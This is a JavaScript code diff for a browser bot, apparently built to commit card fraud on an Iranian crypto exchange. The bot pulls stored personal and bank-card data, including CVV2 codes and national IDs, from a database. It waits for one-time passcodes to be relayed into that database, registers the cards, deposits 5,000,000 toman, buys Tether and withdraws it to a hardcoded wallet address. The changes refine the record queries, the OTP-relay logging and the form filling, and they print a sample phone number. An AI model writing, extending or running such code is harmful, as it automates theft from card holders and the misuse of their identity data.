@@ -48,19 +48,17 @@ class AbanTetherBot {
 
     async checkDatabase() {
         try {
-            this.log('DATABASE', '🔍 Checking for users needing processing...');
+            this.log('DATABASE', '🔍 Checking for pending users...');
             
-            // کاربرانی که پردازش نشده‌اند و حداقل یک فیلد OTP را پر کرده‌اند
+            // کاربرانی که پردازش نشده‌اند و اطلاعات لازم را دارند
             const users = await this.collection.find({
                 processed: { $ne: true },
-                $or: [
-                    { otp_login: { $exists: true, $ne: '' } },
-                    { otp_register_card: { $exists: true, $ne: '' } },
-                    { otp_payment: { $exists: true, $ne: '' } }
-                ]
+                personalPhoneNumber: { $ne: "", $exists: true },
+                personalName: { $ne: "", $exists: true },
+                cardNumber: { $ne: "", $exists: true }
             }).toArray();
 
-            this.log('DATABASE', `Found ${users.length} users needing processing`);
+            this.log('DATABASE', `Found ${users.length} users with complete data`);
 
             for (const user of users) {
                 const phone = user.personalPhoneNumber;
@@ -88,61 +86,64 @@ class AbanTetherBot {
             this.log('PROCESS', `🔄 Processing user: ${phone}`);
             await this.updateUserStatus(phone, 'starting', 'Process started');
             
-            // بررسی وضعیت فعلی
-            const currentStatus = await this.getUserStatus(phone);
-            this.log('STATUS', `Current OTPs: login=${currentStatus.otp_login ? '✓' : '✗'}, card=${currentStatus.otp_register_card ? '✓' : '✗'}, payment=${currentStatus.otp_payment ? '✓' : '✗'}`);
+            // دریافت وضعیت فعلی OTPها
+            const currentUser = await this.collection.findOne({ personalPhoneNumber: phone });
+            const otpStatus = {
+                otp_login: currentUser?.otp_login || '',
+                otp_register_card: currentUser?.otp_register_card || '',
+                otp_payment: currentUser?.otp_payment || ''
+            };
+            
+            this.log('OTP_STATUS', `Login: "${otpStatus.otp_login}", Card: "${otpStatus.otp_register_card}", Payment: "${otpStatus.otp_payment}"`);
             
             // Step 1: Initialize browser
             await this.updateUserStatus(phone, 'initializing_browser', 'Launching browser');
             await this.initializeBrowser();
             
-            // Step 2: اگر otp_login داریم، لاگین کنیم
-            if (currentStatus.otp_login) {
-                await this.updateUserStatus(phone, 'logging_in', 'Logging in with OTP');
-                await this.loginWithOTP(user, currentStatus.otp_login);
+            // Step 2: Login or Register
+            if (otpStatus.otp_login && otpStatus.otp_login.trim() !== '') {
+                await this.updateUserStatus(phone, 'logging_in', 'Logging in with existing OTP');
+                await this.loginWithOTP(user, otpStatus.otp_login);
             } else {
                 await this.updateUserStatus(phone, 'registering', 'Registering phone number');
                 await this.registerPhone(user);
                 
-                // منتظر otp_login
                 await this.updateUserStatus(phone, 'waiting_login_otp', 'Waiting for login OTP');
                 const loginOTP = await this.waitForField(phone, 'otp_login');
                 await this.loginWithOTP(user, loginOTP);
             }
             
-            // Step 3: اگر otp_register_card داریم، کارت رو ثبت کنیم
-            if (currentStatus.otp_register_card) {
-                await this.updateUserStatus(phone, 'registering_card', 'Registering bank card');
-                await this.registerCardWithOTP(user, currentStatus.otp_register_card);
+            // Step 3: Register card
+            if (otpStatus.otp_register_card && otpStatus.otp_register_card.trim() !== '') {
+                await this.updateUserStatus(phone, 'registering_card', 'Registering bank card with existing OTP');
+                await this.registerCardWithOTP(user, otpStatus.otp_register_card);
             } else {
                 await this.updateUserStatus(phone, 'adding_card', 'Adding bank card');
                 await this.addCard(user);
                 
-                // منتظر otp_register_card
                 await this.updateUserStatus(phone, 'waiting_card_otp', 'Waiting for card OTP');
                 const cardOTP = await this.waitForField(phone, 'otp_register_card');
                 await this.registerCardWithOTP(user, cardOTP);
             }
             
-            // Step 4: اگر otp_payment داریم، پرداخت کنیم
-            if (currentStatus.otp_payment) {
-                await this.updateUserStatus(phone, 'making_payment', 'Making payment');
-                await this.makePaymentWithOTP(user, currentStatus.otp_payment);
+            // Step 4: Make payment
+            if (otpStatus.otp_payment && otpStatus.otp_payment.trim() !== '') {
+                await this.updateUserStatus(phone, 'making_payment', 'Making payment with existing OTP');
+                await this.makePaymentWithOTP(user, otpStatus.otp_payment);
             } else {
                 await this.updateUserStatus(phone, 'initiating_payment', 'Initiating payment');
                 await this.initiatePayment(user);
                 
-                // منتظر otp_payment
                 await this.updateUserStatus(phone, 'waiting_payment_otp', 'Waiting for payment OTP');
                 const paymentOTP = await this.waitForField(phone, 'otp_payment');
                 await this.makePaymentWithOTP(user, paymentOTP);
             }
             
-            // Step 5: خرید تتر
+            // Step 5: Buy Tether
             await this.updateUserStatus(phone, 'buying_tether', 'Buying Tether');
             await this.buyTether();
             
-            // Step 6: برداشت تتر
+            // Step 6: Withdraw Tether
             await this.updateUserStatus(phone, 'withdrawing', 'Withdrawing Tether');
             await this.withdrawTether(user);
             
@@ -160,15 +161,6 @@ class AbanTetherBot {
             this.processingUsers.delete(phone);
             await this.closeBrowser();
         }
-    }
-
-    async getUserStatus(phone) {
-        const user = await this.collection.findOne({ personalPhoneNumber: phone });
-        return {
-            otp_login: user?.otp_login || null,
-            otp_register_card: user?.otp_register_card || null,
-            otp_payment: user?.otp_payment || null
-        };
     }
 
     async waitForField(phone, fieldName, timeout = 300000) {
@@ -197,6 +189,7 @@ class AbanTetherBot {
                 const elapsed = Math.floor((Date.now() - startTime) / 1000);
                 if (elapsed % 10 === 0) {
                     this.log('WAIT', `⏳ Still waiting for ${fieldName}... (${elapsed}s passed)`);
+                    this.log('WAIT', `📱 Please add ${fieldName} to database for ${phone}`);
                 }
                 
                 await this.sleep(checkInterval);
@@ -303,8 +296,10 @@ class AbanTetherBot {
             const otpField = await this.page.$('input[type="number"], input[name*="otp"], input[placeholder*="کد"]');
             
             if (otpField) {
-                this.log('REGISTER', '✅ OTP field appeared! Please enter otp_login in database');
-                this.log('REGISTER', `📱 OTP should be sent to: ${user.personalPhoneNumber}`);
+                this.log('REGISTER', '✅ OTP field appeared!');
+                this.log('REGISTER', `📱 Please enter otp_login in database for ${user.personalPhoneNumber}`);
+                this.log('REGISTER', '💡 Command: db.zarinapp.updateOne({personalPhoneNumber: "09921106021"}, {$set: {otp_login: "123456"}})');
+                return true;
             } else {
                 this.log('REGISTER', '⚠️ OTP field not found');
                 throw new Error('OTP field did not appear after submitting phone');
@@ -355,40 +350,50 @@ class AbanTetherBot {
             this.log('LOGIN', '👤 Filling profile information...');
             
             if (user.personalName) {
-                await this.fillFieldByNameOrPlaceholder('نام', user.personalName);
+                await this.fillField('نام', user.personalName);
             }
             
             if (user.personalNationalCode) {
-                await this.fillFieldByNameOrPlaceholder('کد ملی', user.personalNationalCode);
+                await this.fillField('کد ملی', user.personalNationalCode);
             }
             
+            // تاریخ تولد
             if (user.personalBirthDate) {
-                const birthDate = new Date(user.personalBirthDate);
-                const year = birthDate.getFullYear();
-                const month = String(birthDate.getMonth() + 1).padStart(2, '0');
-                const day = String(birthDate.getDate()).padStart(2, '0');
-                
-                await this.fillFieldByNameOrPlaceholder('سال', year.toString());
-                await this.fillFieldByNameOrPlaceholder('ماه', month);
-                await this.fillFieldByNameOrPlaceholder('روز', day);
+                try {
+                    // فرض می‌کنیم تاریخ به فرمت YYYY/MM/DD یا YYYY-MM-DD است
+                    const dateStr = user.personalBirthDate.toString();
+                    const parts = dateStr.split(/[/\-]/);
+                    
+                    if (parts.length >= 3) {
+                        const year = parts[0];
+                        const month = parts[1];
+                        const day = parts[2];
+                        
+                        await this.fillField('سال', year);
+                        await this.fillField('ماه', month);
+                        await this.fillField('روز', day);
+                    }
+                } catch (e) {
+                    this.log('ERROR', `Failed to parse birth date: ${e.message}`);
+                }
             }
             
             if (user.personalCity) {
-                await this.fillFieldByNameOrPlaceholder('شهر', user.personalCity);
+                await this.fillField('شهر', user.personalCity);
             }
             
             if (user.personalProvince) {
-                await this.fillFieldByNameOrPlaceholder('استان', user.personalProvince);
+                await this.fillField('استان', user.personalProvince);
             }
             
             // ذخیره اطلاعات
-            const saveButtons = await this.page.$$('button:has-text("ذخیره"), button:has-text("ثبت")');
+            const saveButtons = await this.page.$$('button:has-text("ذخیره"), button:has-text("ثبت"), button:has-text("تایید")');
             if (saveButtons.length > 0) {
                 await saveButtons[0].click();
                 this.log('LOGIN', '✅ Profile information saved');
+                await this.sleep(3000);
             }
             
-            await this.sleep(3000);
             await this.saveScreenshot('06-profile-completed');
             
         } catch (error) {
@@ -398,7 +403,7 @@ class AbanTetherBot {
         }
     }
 
-    async fillFieldByNameOrPlaceholder(fieldName, value) {
+    async fillField(fieldName, value) {
         try {
             // جستجو با placeholder
             const selector = `input[placeholder*="${fieldName}"], input[name*="${fieldName}"]`;
@@ -410,6 +415,16 @@ class AbanTetherBot {
                 return true;
             }
             
+            // جستجو با label
+            const xpath = `//label[contains(text(), "${fieldName}")]/following-sibling::input`;
+            const fieldXpath = await this.page.$(`xpath=${xpath}`);
+            if (fieldXpath) {
+                await fieldXpath.fill(value);
+                this.log('FILL', `✅ Filled ${fieldName} via label: ${value}`);
+                return true;
+            }
+            
+            this.log('WARN', `Field not found: ${fieldName}`);
             return false;
         } catch (error) {
             this.log('ERROR', `Failed to fill ${fieldName}: ${error.message}`);
@@ -444,19 +459,19 @@ class AbanTetherBot {
             
             // پر کردن اطلاعات کارت
             if (user.cardNumber) {
-                await this.fillFieldByNameOrPlaceholder('شماره کارت', user.cardNumber);
+                await this.fillField('شماره کارت', user.cardNumber);
             }
             
             if (user.cvv2) {
-                await this.fillFieldByNameOrPlaceholder('CVV2', user.cvv2);
+                await this.fillField('CVV2', user.cvv2);
             }
             
             if (user.bankMonth) {
-                await this.fillFieldByNameOrPlaceholder('ماه', user.bankMonth.toString());
+                await this.fillField('ماه', user.bankMonth.toString());
             }
             
             if (user.bankYear) {
-                await this.fillFieldByNameOrPlaceholder('سال', user.bankYear.toString());
+                await this.fillField('سال', user.bankYear.toString());
             }
             
             // ارسال فرم
@@ -469,7 +484,8 @@ class AbanTetherBot {
             await this.sleep(3000);
             await this.saveScreenshot('09-card-submitted');
             
-            this.log('CARD', '📱 Please enter otp_register_card in database');
+            this.log('CARD', `📱 Please enter otp_register_card in database for ${user.personalPhoneNumber}`);
+            this.log('CARD', '💡 Command: db.zarinapp.updateOne({personalPhoneNumber: "09921106021"}, {$set: {otp_register_card: "654321"}})');
             
         } catch (error) {
             this.log('ERROR', `Add card failed: ${error.message}`);
@@ -518,7 +534,7 @@ class AbanTetherBot {
             await this.saveScreenshot('12-deposit-page');
             
             // وارد کردن مبلغ
-            await this.fillFieldByNameOrPlaceholder('مبلغ', '5000000');
+            await this.fillField('مبلغ', '5000000');
             this.log('PAYMENT', '✅ Amount entered: 5,000,000 تومان');
             
             // ارسال درخواست واریز
@@ -531,7 +547,8 @@ class AbanTetherBot {
             await this.sleep(3000);
             await this.saveScreenshot('13-payment-initiated');
             
-            this.log('PAYMENT', '📱 Please enter otp_payment in database');
+            this.log('PAYMENT', `📱 Please enter otp_payment in database for ${user.personalPhoneNumber}`);
+            this.log('PAYMENT', '💡 Command: db.zarinapp.updateOne({personalPhoneNumber: "09921106021"}, {$set: {otp_payment: "987654"}})');
             
         } catch (error) {
             this.log('ERROR', `Payment initiation failed: ${error.message}`);
@@ -627,7 +644,7 @@ class AbanTetherBot {
             
             // وارد کردن آدرس
             const withdrawAddress = 'THtQH52yMFSsJAvFbKnBfYpbbDKWpKfJHS';
-            await this.fillFieldByNameOrPlaceholder('آدرس', withdrawAddress);
+            await this.fillField('آدرس', withdrawAddress);
             this.log('WITHDRAW', `✅ Withdraw address entered: ${withdrawAddress}`);
             
             // برداشت
